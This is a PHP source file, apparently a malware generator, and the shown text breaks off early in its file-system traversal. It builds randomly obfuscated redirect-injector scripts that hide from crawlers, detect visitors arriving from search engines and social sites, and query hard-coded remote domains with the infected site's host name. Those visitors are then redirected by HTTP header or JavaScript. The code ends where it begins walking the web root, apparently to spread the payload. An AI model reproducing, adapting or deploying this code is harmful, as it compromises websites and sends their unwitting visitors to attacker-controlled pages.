<?php
error_reporting(0);
set_time_limit(0);
function generateRandomString() {
    $characters = ',+)(@#$%^&*';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < mt_rand(1,4); $i++) {
        $randomString .= $characters[mt_rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function generateRandString() {
    $characters = '0123456789abcdefghjklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < mt_rand(5,12); $i++) {
        $randomString .= $characters[mt_rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function str_repl($search,$rep,$text) {
	$pos = strpos($text, $search);
	return $pos!==false ? substr_replace($text, $rep, $pos, strlen($search)) : $text;
}
function get_file(){
	$file = base64_decode('PD9waHANCi0tLS0tLS0tLS0tLS0tLS0tLQ0KZXJyb3JfcmVwb3J0aW5nKDApOw0Kc2V0X3RpbWVfbGltaXQoMCk7DQokdmFyMXstLW5ld3Jvdy0tfSRfU0VSVkVSW3stLWFtcGVyc2FuZC0tfUhUVFBfUkVGRVJFUnstLWFtcGVyc2FuZC0tfV07DQokdmFyMnstLW5ld3Jvdy0tfSRfU0VSVkVSW3stLWFtcGVyc2FuZC0tfUhUVFBfVVNFUl9BR0VOVHstLWFtcGVyc2FuZC0tfV07DQokdmFyM3stLW5ld3Jvdy0tfXstLXJlZmVycmVyLS19DQokdmFyNHstLW5ld3Jvdy0tfXstLXVzZXJhZ2VudC0tfQ0KJHZhcjV7LS1uZXdyb3ctLX10cnVlOw0KJHZhcjZ7LS1uZXdyb3ctLX1mYWxzZTsNCi0tLS0tLS0tLS0tLS0tLS0tLQ0KJHZhcjd7LS1uZXdyb3ctLX1leHBsb2RlKHstLXVzZXJhZ2VudGRlbGltLS19LCR2YXI0KTsNCiR2YXIxM3stLW5ld3Jvdy0tfWV4cGxvZGUoey0tcmVmZXJyZXJkZWxpbS0tfSwkdmFyMyk7DQotLS0tLS0tLS0tLS0tLS0tLS0NCmZvcmVhY2goJHZhcjcgYXMgJHZhcjgpew0KCXstLXVzZXJhZ2VucmV2ZXJzZS0tfQ0KCWlmKHN0cnBvcygkdmFyMiwkdmFyOCkgIT09IGZhbHNlKXsNCgkJc2V0Y29va2llKHstLWNvb2tpZXMtLX0sey0tY29va2llc3ZhbC0tfSx0aW1lKCkrey0tdGltZXItLX0sey0tYW1wZXJzYW5kLS19L3stLWFtcGVyc2FuZC0tfSk7DQoJCSR2YXI1ey0tbmV3cm93LS19ZmFsc2U7DQoJCXstLWlmbmVlZC0tfQ0KCX0NCn07DQpmb3JlYWNoKCR2YXIxMyBhcyAkdmFyOCl7DQoJey0tcmVmZXJyZXJyZXZlcnNlLS19DQoJaWYoc3RycG9zKCR2YXIxLCR2YXI4KSAhPT0gZmFsc2Upew0KCQkkdmFyNnstLW5ld3Jvdy0tfXRydWU7DQoJCXstLWlmbmVlZC0tfQ0KCX0NCn07DQotLS0tLS0tLS0tLS0tLS0tLS0NCmlmKCEkX0NPT0tJRVt7LS1jb29raWVzLS19XXstLWFuZC0tfSR2YXI1ID09PSB0cnVley0tYW5kLS19JHZhcjYgPT09IHRydWUpew0KCSR2YXI5ey0tbmV3cm93LS19bWQ1KHstLWFtcGVyc2FuZC0tfSR2YXIxNHstLWFtcGVyc2FuZC0tfSk7DQoJJHZhcjEwey0tbmV3cm93LS19ZGlybmFtZShfX0ZJTEVfXykuey0tYW1wZXJzYW5kLS19L3stLWFtcGVyc2FuZC0tfTsNCglpZihmaWxlX2V4aXN0cygkdmFyMTAuJHZhcjkpKXsNCgkJJHZhcjExey0tbmV3cm93LS19ZmlsZW10aW1lKCR2YXIxMC4kdmFyOSk7DQoJfXstLWVsc2UtLX17DQoJCSR2YXIxMXstLW5ld3Jvdy0tfXRpbWUoKS17LS10aW1lcjEtLX07DQoJfQ0KCSR2YXIxMnstLW5ld3Jvdy0tfXstLWFtcGVyc2FuZC0tfXstLWFtcGVyc2FuZC0tfTsNCglpZih0aW1lKCktey0tdGltZXIyLS19ID49ICR2YXIxMSl7DQoJCWlmKGZ1bmN0aW9uX2V4aXN0cyh7LS1jdXJsX3ZlcnNpb24tLX0pKXsNCgkJCSR2YXIxM3stLW5ld3Jvdy0tfWN1cmxfaW5pdCgpOw0KCQkJY3VybF9zZXRvcHQoJHZhcjEzLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsdHJ1ZSk7DQoJCQljdXJsX3NldG9wdCgkdmFyMTMsQ1VSTE9QVF9VUkwsey0tZG9tYWluLS19LnstLWFtcGVyc2FuZC0tfT97LS1hbXBlcnNhbmQtLX0uey0tY29va2llczEtLX0uey0tYW1wZXJzYW5kLS19PXstLWFtcGVyc2FuZC0tfS5iYXNlNjRfZW5jb2RlKCgoIWVtcHR5KCRfU0VSVkVSW3stLWFtcGVyc2FuZC0tfUhUVFBTey0tYW1wZXJzYW5kLS19XSkpID8gey0tYW1wZXJzYW5kLS19aHR0cHN7LS1hbXBlcnNhbmQtLX0gOiB7LS1hbXBlcnNhbmQtLX1odHRwey0tYW1wZXJzYW5kLS19KS57LS1hbXBlcnNhbmQtLX06Ly97LS1hbXBlcnNhbmQtLX0uJF9TRVJWRVJbey0tYW1wZXJzYW5kLS19SFRUUF9IT1NUey0tYW1wZXJzYW5kLS19XSkpOw0KCQkJY3VybF9zZXRvcHQoJHZhcjEzLENVUkxPUFRfVElNRU9VVCx7LS10aW1lcjMtLX0pOw0KCQkJJHZhcjEyey0tbmV3cm93LS19Y3VybF9leGVjKCR2YXIxMyk7DQoJCQljdXJsX2Nsb3NlKCR2YXIxMyk7DQoJCX0NCgkJaWYoJHZhcjEyID09IHstLWFtcGVyc2FuZC0tfXstLWFtcGVyc2FuZC0tfSl7DQoJCQkkdmFyMTJ7LS1uZXdyb3ctLX1maWxlX2dldF9jb250ZW50cyh7LS1kb21haW4xLS19LnstLWFtcGVyc2FuZC0tfT97LS1hbXBlcnNhbmQtLX0uey0tY29va2llczItLX0uey0tYW1wZXJzYW5kLS19PXstLWFtcGVyc2FuZC0tfS5iYXNlNjRfZW5jb2RlKCgoIWVtcHR5KCRfU0VSVkVSW3stLWFtcGVyc2FuZC0tfUhUVFBTey0tYW1wZXJzYW5kLS19XSkpID8gey0tYW1wZXJzYW5kLS19aHR0cHN7LS1hbXBlcnNhbmQtLX0gOiB7LS1hbXBlcnNhbmQtLX1odHRwey0tYW1wZXJzYW5kLS19KS57LS1hbXBlcnNhbmQtLX06Ly97LS1hbXBlcnNhbmQtLX0uJF9TRVJWRVJbey0tYW1wZXJzYW5kLS19SFRUUF9IT1NUey0tYW1wZXJzYW5kLS19XSkpOw0KCQl9DQoJCWZpbGVfcHV0X2NvbnRlbnRzKCR2YXIxMC4kdmFyOSwkdmFyMTIpOw0KCX17LS1lbHNlLS19ew0KCQkkdmFyMTJ7LS1uZXdyb3ctLX1maWxlX2dldF9jb250ZW50cygkdmFyMTAuJHZhcjkpOw0KCX0NCglzZXRjb29raWUoey0tY29va2llcy0tfSx7LS1jb29raWVzdmFsLS19LHRpbWUoKSt7LS10aW1lci0tfSx7LS1hbXBlcnNhbmQtLX0vey0tYW1wZXJzYW5kLS19KTsNCglpZihzdHJsZW4oJHZhcjEyKSA9PSAwKXsNCgkJJHZhcjEyey0tbmV3cm93LS19ey0tZG9tYWlucG9zaWJsZXJlZC0tfS57LS1hbXBlcnNhbmQtLX0/ey0tYW1wZXJzYW5kLS19LnstLWNvb2tpZXMyLS19LnstLWNvb2tpZXMxLS19LnstLWFtcGVyc2FuZC0tfT17LS1hbXBlcnNhbmQtLX0uYmFzZTY0X2VuY29kZSgoKCFlbXB0eSgkX1NFUlZFUlt7LS1hbXBlcnNhbmQtLX1IVFRQU3stLWFtcGVyc2FuZC0tfV0pKSA/IHstLWFtcGVyc2FuZC0tfWh0dHBzey0tYW1wZXJzYW5kLS19IDogey0tYW1wZXJzYW5kLS19aHR0cHstLWFtcGVyc2FuZC0tfSkuey0tYW1wZXJzYW5kLS19Oi8vey0tYW1wZXJzYW5kLS19LiRfU0VSVkVSW3stLWFtcGVyc2FuZC0tfUhUVFBfSE9TVHstLWFtcGVyc2FuZC0tfV0pOw0KCX0NCgl7LS1vcnJyci0tfWhlYWRlcih7LS1sb2NhdGlvbi0tfS4kdmFyMTIpO3stLW9ycnJyLS19ZWNobyB7LS1qYXZhc2NyaXB0MS0tfSAuICR2YXIxMiAuIHstLWphdmFzY3JpcHQyLS19IC4gJHZhcjEyIC4gey0tamF2YXNjcmlwdDMtLX07ey0tb3JycnItLX1lY2hvIHstLWphdmFzY3JpcHQ0LS19IC4gJHZhcjEyIC4gJyYnIC4gJF9TRVJWRVJbey0tYW1wZXJzYW5kLS19UVVFUllfU1RSSU5Hey0tYW1wZXJzYW5kLS19XSAuIHstLWphdmFzY3JpcHQzLS19O3stLW9ycnJyLS19DQoJZXhpdCgpOw0KfQ');
	$fulldom = array('http://pitmalohit.online/','http://purinagun.space/','http://purinagun.online/','http://partagun.online/','http://jikolahit.online/','http://jikolahit.fun/');
	$fulldoms = array('http://pitmalohit.website/help/');
	$redirectdom = array('t.co','.aol.','.astronaut.at','.austronaut.at','.dastelefonbuch.de','.exalead.','.excite.','.sm.cn','.zoek.nl','1.cz','1881.no','2gis.ru','Keywords','Sozluk.com','abacho.','abcsolk.no','acoon.de','alexa.com','aliceadsl.fr','all.by','alltheweb.com','altavista.','amazon.com','apollo.lv/portal/search/','apollo7.de','apontador.com.br','arama.com','arcor.de','ariadna.elmundo.es','arianna.com','ask.','askkids.com','badoo.com','baidu.com','be-fr.altavista.com','be-nl.altavista.com','bebo.com','bing.com','bingj.com','blackplanet.com','blekko.com','blogdigger.com','blogpulse.com','blogs.icerocket.com','busca.orange.es','busca.uol.com.br','buscador.terra','buzznet.com','centrum.cz','cercato.it','charter.net','class.hit-parade.com','classmates.com','clusty.com','cnn.com','crawler.com','cuil.com','darkoogle.com','dasoertliche.de','delicious.com','digg.com','disq.us','disqus.com','dizionario.it.msn.com','dmoz.org','dogpile.com','donanimhaber.com','douban.com','duckduckgo.com','ecosia.org','eniro.se','eo.st','eu.ixquick.com','eurip.com','euroseek.com','everyclick.com','facebook.','fastweb.it','fb.me','find.tdc.dk','finderoo.com','fireball.de','firstsfind.com','fixsuche.de','flickr.com','flix.de','flixster.com','forestle.mobi','forestle.org','forums.whirlpool.net.au','fotolog.com','foursquare.com','fr2.rpmfind.net','francite.com','fresh-weather.com','friendfeed.com','friendsreunited.com','friendster.com','gaiaonline.com','gais.cs.ccu.edu.tw','geni.com','geona.net','getpocket.com','gigablast.com','github.com','global.cyworld.com','gnadenmeer.de','go.mail.ru','gomeo.com','google.','googleearth.','googleusercontent.com','goyellow.de','gulesider.no','habbo.com','hi5.com','highbeam.com','hit-parade.com','hledani.tiscali.cz','hocam.com','holmes.ge','hooseek.com','hotbot.com','hyves.nl','icq.com','identi.ca','ilse.nl','inbox.com','inci.sozlukspot.com','incisozluk.cc','incisozluk.com','incredimail.','infospace.com','instagram.','instela.com','itusozluk.com','ixquick.com','ixquick.de','jungle-spider.de','junglekey.','jyxo.1188.cz','kataweb.it','kununu.com','kvasir.no','lastfm.ru','latne.lv','lemoteur.','libero.it','link.2gis.ru','linkedin.com','listings.altavista.com','live.com','liveinternet.ru','livejournal.ru','lnkd.in','lo.st','looksmart.com','lycos.com','maailm.com','mail.ru','mamma.com','mamma75.mamma.com','marktplaats.nl','meinestadt.de','meta.rrzn.uni-hannover.de','meta.ua','metacrawler.','metager.de','metager2.de','mister-wong.','mixi.jp','moikrug.ru','monstercrawler.com','mozbot.','msnbc.msn.com','multiply.com','my.mail.ru','myheritage.com','mylife.ru','myspace.com','myyearbook.com','najdi.si','neti.ee','netlog.com','news.ycombinator.com','nigma.ru','nk.pl','nova.rambler.ru','odnoklassniki.ru','ok.ru','online.no','orkut.com','otsing.delfi.ee','paper.li','paperball.de','pesquisa.','pinterest.com','plaxo.com','plazoo.com','poisk.ru','pricerunner.co.uk','qbyrd.com','qualigo.','quark.sm.cn','quora.com','qwant.com','qzone.qq.com','reddit.com','renren.com','req.-hit-parade.com','rpmfind.net','search-dyn.tiscali.it','search-intl.netscape.com','search-results.com','search.','search1-1.free.fr','search1-2.free.fr','searchalot.com','searchatlas.centrum.cz','searchcanvas.com','searches.globososo.com','searchresults.verizon.com','searchthis.com','searchy.co.uk','serach.comcast.net','sharelook.fr','skynet.be','skyrock.com','sm.aport.ru','smart.delfi.lv','so.360.cn','so.com','so.m.sm.cn','sonico.com','soso.com','sosodesktop.com','sougou.com','sourceforge.net','sourtimes.org','stackoverflow.com','start.facemoods.com','start.iplay.com','startsiden.no','studivz.net','stumbleupon.com','suche.aolsvc.de','suche.freenet.de','suche.gmx.net','suche.info','suche.web.de','suchmaschine.com','suchnase.de','szukaj.onet.pl','szukaj.wp.pl','t-online.de','t.umblr.com','tagged.com','talktalk.co.uk','taringa.net','technorati.com','teoma.com','tixuma.de','toile.com','toolbarhome.com','trouvez.com','trovarapido.com','tuenti.com','tumblr.com','twingly.com','twitter.com','uludagsozluk.com','ulusozluk.com','url.org','us.ixquick.com','verden.abcsok.no','viadeo.com','vimeo.com','vinden.nl','vindex.nl','virgilio.it','vk.com','vkontakte.ru','vkrugudruzei.ru','vshare.toolbarhome.com','walhello.','wayn.com','web.canoe.ca','web.gougou.com','web.nl','web.skype.com','web.toile.com','web.volny.cz','web.whatsapp.com','webcrawler.com','webfetch.com','weborama.com','weeworld.com','weibo.com','witch.de','x-recherche.com','xanga.com','xing.com','yahoo.','yandex.','yasni.','yatedo.','yougoo.fr','youtu.be','youtube.com','ys.mirostart.com','yz.m.sm.cn','zapmeta.','zhongsou.com','zoeken.nl','zoohoo.cz','//t.co');
	$useragent = array('Abonti','aggregator','AhrefsBot','Aport','asterias','Baiduspider','bingbot','binance','BackupLand','Barkrowler','BDCbot','Birubot','BLEXBot','BUbiNG','BuiltBotTough','Bullseye','BunnySlippers','Butterfly','CamontSpider','CCBot','Cegbfeieh','CheeseBot','CherryPicker','coccoc','CopyRightCheck','cosmos','crawler','Crescent','CyotekWebCopy','CyotekHTTP','DataForSeoBot','DeuSu','discobot','DittoSpyder','DnyzBot','DomainCrawler','DotBot','DownloadNinja','dcrawl','EasouSpider','EmailCollector','EmailSiphon','EmailWolf','EroCrawler','Exabot','ExtractorPro','Ezooms','facebookexternalhit','FairShare','Fasterfox','FeedBooster','Foobot','Genieo','GetIntentCrawler','Gigabot','GrapeshotCrawler','Go-http-client','Harvest','hloader','HTTrack','humanlinks','HybridBot','ieautodiscovery','Incutio','InfoNaviRobot','InternetSeer','ips-agent','IstellaBot','JamesBOT','JennyBot','JS-Kit','Jooblebot','k2spider','Kenjin','kmSearchBot','larbin','LexiBot','Linguee','LinkExchanger','LinkextractorPro','linko','LinkWalker','LinkpadBot','lmspider','LNSpiderguy','ltx71','lwp-trivial','Mail.RU_Bot','magpie','MataHari','MaxPointCrawler','MegaIndex','memoryBot','MIIxpc','Mippin','MisterPiX','MJ12bot','MLBot','moget','MSIECrawler','msnbot','msnbot-media','NetAnts','NetcraftSurveyAgent','NICErsPRO','NjuiceBot','NPBot','Nutch','OfflineExplorer','OLEcrawler','Openfind','openstat.ru','panscient','PostRank','PetalBot','ProWebWalker','ptd-crawler','Purebot','PycURL','QueryNMetasearch','RepoMonkey','Riddler','RMA','Scrapy','SemrushBot','serf','SeznamBot','SISTRIX','SiteBot','SiteSnagger','Serpstat','Slurp','SnapPreviewBot','Sogou','Soup','SpankBot','spanner','spbot','Spinn3r','SpyFu','statdom.ru','SputnikBot','suggybot','SurveyBot','suzuran','Teleport','Telesoft','TheIntraformant','TheNomad','TightTwatBot','Titan','True_Robot','ttCrawler','turingos','TurnitinBot','TOBBOT','UbiCrawler','UnisterBot','URLyWarning','VCI','Vedma','Voyager','WBSearchBot','WebAuto','WebBandit','WebDataStats','WebCopier','WebEnhancer','WebmasterWorldForumBot','WebReaper','webprosbot','WebSauger','WebStripper','WebZip','Wotbox','YottosBot','Yeti','YandexFavicons','Zao','Zeus','ZyBORG','python\-requests','ALittle\ Client','Apache\-HttpClient');
	$delimetr = array(generateRandomString(),generateRandomString(),generateRandomString(),generateRandomString());
	$data = array();
	shuffle($redirectdom);
	shuffle($useragent);
	$data['vars'] = array();
	foreach ($redirectdom as $key => $val){
		$data['vars'][$key] = generateRandString();
		$first = substr($data['vars'][$key], 0, 1);
		if (is_numeric($first)) {
			$data['vars'][$key] = str_replace($first,'_',$data['vars'][$key]);
		}
		$data['vars'][$key] = '$'.$data['vars'][$key];
		if ($key == 60){
			break;
		}
	}
	$data['cookies'] = '{--ampersand--}'.generateRandString().'{--ampersand--}';
	$data['cookies1'] = '{--ampersand--}'.generateRandString().'{--ampersand--}';
	$data['cookies2'] = '{--ampersand--}'.generateRandString().'{--ampersand--}';
	$data['timer'] = 259200 - mt_rand(-1000,1000);
	$data['timer1'] = mt_rand(80,120);
	$data['timer2'] = $data['timer1']-mt_rand(5,15);
	$data['timer3'] = mt_rand(5,10);
	if (1 == mt_rand(0,1)){
		$data['and'] = ' && ';
	} else {
		$data['and'] = ' and ';
	}
	if (1 == mt_rand(0,1)){
		$data['ifneed'] = '';
	} else {
		$data['ifneed'] = 'break;';
	}
	$data['curl_version']['curl_version'] = 'curl_version';
	if (1 == mt_rand(0,1)){
		$data['curl_version']['curl_version'] = strrev($data['curl_version']['curl_version']);
		$data['curl_version']['reverse'] = 1;
	} else {
		$data['curl_version']['reverse'] = 0;
	}
	if (1 == mt_rand(0,1)){
		$data['curl_version']['base64'] = 1;
		$data['curl_version']['curl_version'] = 'base64_decode({--ampersand--}'.str_replace('=','',base64_encode($data['curl_version']['curl_version'])).'{--ampersand--})';
		if ($data['curl_version']['reverse'] == 1){
			$data['curl_version']['curl_version'] = 'strrev('.$data['curl_version']['curl_version'].')';
		}
		if (1 == mt_rand(0,1)){
			$data['curl_version']['curl_version'] = str_replace('););','));',$data['curl_version']['curl_version']);
		}
	} else {
		$data['curl_version']['base64'] = 0;
		if ($data['curl_version']['reverse'] == 1){
			$data['curl_version']['curl_version'] = 'strrev({--ampersand--}'.$data['curl_version']['curl_version'].'{--ampersand--})';
		}
	}
	$data['curl_version'] = $data['curl_version']['curl_version'];
	if (strpos($data['curl_version'], '{--ampersand--}') === false) {
		$data['curl_version'] = '{--ampersand--}'.$data['curl_version'].'{--ampersand--}';
	}
	$data['location']['location'] = 'Location: ';
	if (1 == mt_rand(0,1)){
		$data['location']['location'] = strrev($data['location']['location']);
		$data['location']['reverse'] = 1;
	} else {
		$data['location']['reverse'] = 0;
	}
	if (1 == mt_rand(0,1)){
		$data['location']['base64'] = 1;
		$data['location']['location'] =  'base64_decode({--ampersand--}'.str_replace('=','',base64_encode($data['location']['location'])).'{--ampersand--})';
		if ($data['location']['reverse'] == 1){
			$data['location']['location'] = 'strrev('.$data['location']['location'].')';
		}
		if (1 == mt_rand(0,1)){
			$data['location']['location'] = str_replace('););','));',$data['location']['location']);
		}
	} else {
		$data['location']['base64'] = 0;
		if ($data['location']['reverse'] == 1){
			$data['location']['location'] = 'strrev({--ampersand--}'.$data['location']['location'].'{--ampersand--})';
		}
	}
	$data['location'] = $data['location']['location'];
	if (strpos($data['location'], '{--ampersand--}') === false) {
		$data['location'] = '{--ampersand--}'.$data['location'].'{--ampersand--}';
	}
	$data['domain']['domain'] = $fulldom[array_rand($fulldom)];
	if (1 == mt_rand(0,1)){
		$data['domain']['base64'] = 1;
		$data['domain']['domain'] = 'base64_decode({--ampersand--}'.str_replace('=','',base64_encode($data['domain']['domain'])).'{--ampersand--})';
	} else {
		$data['domain']['base64'] = 0;
	}
	if ($data['domain']['base64'] == 0){
		if (1 == mt_rand(0,1)){
			$data['domain']['domain'] = 'strrev({--ampersand--}'.strrev($data['domain']['domain']).'{--ampersand--})';
			$data['domain']['reverse'] = 1;
		} else {
			$data['domain']['reverse'] = 0;
		}
	} else {
		$data['domain']['reverse'] = 0;
	}
	$data['domain'] = $data['domain']['domain'];
	if (strpos($data['domain'], '{--ampersand--}') === false) {
		$data['domain'] = '{--ampersand--}'.$data['domain'].'{--ampersand--}';
	}
	$data['domainposiblered']['domainposiblered'] = $fulldoms[array_rand($fulldoms)];
	if (1 == mt_rand(0,1)){
		$data['domainposiblered']['base64'] = 1;
		$data['domainposiblered']['domainposiblered'] = 'base64_decode({--ampersand--}'.str_replace('=','',base64_encode($data['domainposiblered']['domainposiblered'])).'{--ampersand--})';
	} else {
		$data['domainposiblered']['base64'] = 0;
	}
	if ($data['domainposiblered']['base64'] == 0){
		if (1 == mt_rand(0,1)){
			$data['domainposiblered']['domainposiblered'] = 'strrev({--ampersand--}'.strrev($data['domainposiblered']['domainposiblered']).'{--ampersand--})';
			$data['domainposiblered']['reverse'] = 1;
		} else {
			$data['domainposiblered']['reverse'] = 0;
		}
	} else {
		$data['domainposiblered']['reverse'] = 0;
	}
	$data['domainposiblered'] = $data['domainposiblered']['domainposiblered'];
	if (strpos($data['domainposiblered'], '{--ampersand--}') === false) {
		$data['domainposiblered'] = '{--ampersand--}'.$data['domainposiblered'].'{--ampersand--}';
	}
	$data['domain1']['domain'] = $fulldom[array_rand($fulldom)];
	if (1 == mt_rand(0,1)){
		$data['domain1']['base64'] = 1;
		$data['domain1']['domain'] = 'base64_decode({--ampersand--}'.str_replace('=','',base64_encode($data['domain1']['domain'])).'{--ampersand--})';
	} else {
		$data['domain1']['base64'] = 0;
	}
	if ($data['domain1']['base64'] == 0){
		if (1 == mt_rand(0,1)){
			$data['domain1']['domain'] = 'strrev({--ampersand--}'.strrev($data['domain1']['domain']).'{--ampersand--})';
			$data['domain1']['reverse'] = 1;
		} else {
			$data['domain1']['reverse'] = 0;
		}
	} else {
		$data['domain1']['reverse'] = 0;
	}
	$data['domain1'] = $data['domain1']['domain'];
	if (strpos($data['domain1'], '{--ampersand--}') === false) {
		$data['domain1'] = '{--ampersand--}'.$data['domain1'].'{--ampersand--}';
	}
	$del = $delimetr[array_rand($delimetr)];
	$data['referrerdelim'] = $del;
	foreach ($delimetr as $key => $val) {
		if ($val == $del){
			$string_version = implode($del, $redirectdom);
			if (1 == mt_rand(0,1)){
				$string_version = strrev($string_version);
				$data['referrerdelim'] = strrev($data['referrerdelim']);
				$data['referrerreverse'] = 1;
			} else {
				$data['referrerreverse'] = 0;
			}
			if (1 == mt_rand(0,1)){
				$data['referrer']['gzencode'] = 1;
				$string_version = gzencode($string_version);
			} else {
				$data['referrer']['gzencode'] = 0;
			}
			if (1 == mt_rand(0,1) || $data['referrer']['gzencode'] == 1 ){
				$data['referrer']['base64'] = 1;
				$string_version =  base64_encode($string_version);
			} else {
				$data['referrer']['base64'] = 0;
			}
			if ($data['referrer']['base64'] == 0) {
				if (1 == mt_rand(0,1)){
					$string_version =  '{--ampersand--}'.urlencode($string_version).'{--ampersand--};';
					$data['referrerdelim'] =  urlencode($data['referrerdelim']);
				}
			}
		}
	}
	unset($redirectdom);
	$data['referrer']['referrer'] = $string_version;
	if ($data['referrer']['base64'] == 1) {
		$data['referrer']['referrer'] = 'base64_decode({--ampersand--}'.$data['referrer']['referrer'].'{--ampersand--});';
	}
	if ($data['referrer']['gzencode'] == 1) {
		$data['referrer']['referrer'] = 'gzdecode('.$data['referrer']['referrer'].');';
	}
	$data['referrer']['referrer'] = str_replace('););','));',$data['referrer']['referrer']);
	if (strpos($data['referrer']['referrer'], '{--ampersand--}') === false) {
		$data['referrer']['referrer'] = '{--ampersand--}'.$data['referrer']['referrer'].'{--ampersand--};';
	}
	$data['referrerdelim'] = "'".$data['referrerdelim']."'";
	$data['referrer'] = $data['referrer']['referrer'];
	$del = $delimetr[array_rand($delimetr)];
	$data['useragentdelim'] = $del;
	foreach ($delimetr as $key => $val) {
		if ($val == $del){
			$string_version = implode($del, $useragent);
			if (1 == mt_rand(0,1)){
				$string_version = strrev($string_version);
				$data['useragentdelim'] = strrev($data['useragentdelim']);
				$data['useragenreverse'] = 1;
			} else {
				$data['useragenreverse'] = 0;
			}
			if (1 == mt_rand(0,1)){
				$data['useragent']['gzencode'] = 1;
				$string_version = gzencode($string_version);
			} else {
				$data['useragent']['gzencode'] = 0;
			}
			if (1 == mt_rand(0,1) || $data['useragent']['gzencode'] == 1 ){
				$data['useragent']['base64'] = 1;
				$string_version =  base64_encode($string_version);
			} else {
				$data['useragent']['base64'] = 0;
			}
			if ($data['useragent']['base64'] == 0) {
				if (1 == mt_rand(0,1)){
					$string_version =  '{--ampersand--}'.urlencode($string_version).'{--ampersand--};';
					$data['useragentdelim'] =  urlencode($data['useragentdelim']);
				}
			}
		}
	}
	unset($del);
	unset($delimetr);
	unset($useragent);
	$data['useragent']['useragent'] = $string_version;
	unset($string_version);
	if ($data['useragent']['base64'] == 1) {
		$data['useragent']['useragent'] = 'base64_decode({--ampersand--}'.$data['useragent']['useragent'].'{--ampersand--});';
	}
	if ($data['useragent']['gzencode'] == 1) {
		$data['useragent']['useragent'] = 'gzdecode('.$data['useragent']['useragent'].');';
	}
	$data['useragent']['useragent'] = str_replace('););','));',$data['useragent']['useragent']);
	if (strpos($data['useragent']['useragent'], '{--ampersand--}') === false) {
		$data['useragent']['useragent'] = '{--ampersand--}'.$data['useragent']['useragent'].'{--ampersand--};';
	}
	$data['useragentdelim'] = "'".$data['useragentdelim']."'";
	$data['useragent'] = $data['useragent']['useragent'];
	if (1 == mt_rand(0,1)){
		$data['javascript1'] = 'base64_decode({--ampersand--}PGh0bWw+PGhlYWQ+PC9oZWFkPjxib2R5PjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij53aW5kb3cubG9jYXRpb24ucmVwbGFjZSgi{--ampersand--})';
	}else{
		$data['javascript1'] = '\'<html><head></head><body><script type="text/javascript">window.location.replace("\'';
	}
	if (1 == mt_rand(0,1)){
		$data['javascript2'] = 'base64_decode({--ampersand--}Iik7IHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gIg{--ampersand--})';
	}else{
		$data['javascript2'] = '\'"); window.location.href = "\'';
	}
	if (1 == mt_rand(0,1)){
		$data['javascript3'] = 'base64_decode({--ampersand--}Ijs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg{--ampersand--})';
	}else{
		$data['javascript3'] = '\'";</script></body></html>\'';
	}
	if (1 == mt_rand(0,1)){
		$data['javascript4'] = 'base64_decode({--ampersand--}PGh0bWw+PGhlYWQ+PC9oZWFkPjxib2R5PjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij53aW5kb3cudG9wLmxvY2F0aW9uLmhyZWYgPSAi{--ampersand--})';
	}else{
		$data['javascript4'] = '\'<html><head></head><body><script type="text/javascript">window.top.location.href = "\'';
	}
	if (1 == mt_rand(0,1)){
		$data['ampersand'] = "'";
	}else{
		$data['ampersand'] = '"';
	}
	if (1 == mt_rand(0,1)){
		$data['newrow'] = " = ";
	}else{
		$data['newrow'] = '=';
	}
	if (1 == mt_rand(0,1)){
		$data['else'] = ' else ';
	}else{
		$data['else'] = 'else';
	}
	$data['cookiesval'] = mt_rand(0,1000);
	$data['vars'] = array_reverse($data['vars'], true);
	foreach ($data as $key => $value){
		if ($key == 'useragenreverse' || $key == 'referrerreverse'){
			if ($value == 1) {
				$file = str_replace('{--'.$key.'--}','$var8{--newrow--}strrev($var8);',$file);
			}else{
				$file = str_replace('{--'.$key.'--}','',$file);
			}
		}
		if ($key != 'vars'){
			$file = str_replace('{--'.$key.'--}',$value,$file);
		}
	}
	foreach ($data['vars'] as $key => $value){
		$file = str_replace('$var'.$key,$value,$file);
	}
	if (1 == mt_rand(0,1)){
		$file = str_replace('			','',$file);
	}else{
		$file = str_replace('	','',$file);
	}
	$file = str_replace("md5('$","md5('",$file);
	$file = str_replace('md5("$','md5("',$file);
	$file = preg_replace('/^[ \t]*[\r\n]+/m', '', $file);
	$data = explode('------------------',$file);
	$data[0] = trim($data[0]);
	$vars = explode("\r\n",trim($data[1]));
	shuffle($vars);
	if (1 == mt_rand(0,1)){
		$data[1] = trim(implode("\n",$vars));
	}else{
		$data[1] = trim(implode(' ',$vars));
	}
	$vars = explode("\r\n",trim($data[2]));
	shuffle($vars);
	if (1 == mt_rand(0,1)){
		$data[2] = implode("\n",$vars);
	}else{
		$data[2] = implode(' ',$vars);
	}
	$vars = explode("\r\n",trim($data[3]));
	if (1 == mt_rand(0,1)){
		$data[3] = implode("\n",$vars);
	}else{
		$data[3] = implode(' ',$vars);
	}
	$vars = explode("\r\n",trim($data[4]));
	if (1 == mt_rand(0,1)){
		$data[4] = implode("\n",$vars);
	}else{
		$data[4] = implode(' ',$vars);
	}
	if (1 == mt_rand(0,1)){
		$file = implode("\n",$data);;
	}else{
		$file = implode(" ",$data);
	}
	$file = str_replace('  ',' ',$file);
	$file = preg_replace('/^[ \t]*[\r\n]+/m', '', $file);
	$file = str_replace('exit; }','exit();}', $file);
	if (1 == mt_rand(0,1)){
		$file = str_replace("\ncurl_setopt",' curl_setopt', $file);
	}
	$file = str_replace("}\n};","  }\n};", $file);
	if (1 == mt_rand(0,1)){
		if (1 == mt_rand(0,1)){
			$file = str_replace(' === true',' !== false', $file);
		} else {
			$file = str_repl(' === true',' !== false', $file);
		}
	}
	if (1 == mt_rand(0,1)){
		if (1 == mt_rand(0,1)){
			$file = str_replace(' === true',' == true', $file);
		} else {
			$file = str_repl(' === true',' == true', $file);
		}
	}
	$data = explode('{--orrrr--}',$file);
	$file = $data[0].$data[rand(1,3)].$data[4];
	return $file;
}
$path = $_SERVER['DOCUMENT_ROOT'];
$result[] = $path;
if(strlen($path) == 0) {
	$path = dirname(__FILE__);
}
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
	$patharr = explode('\\',$path);
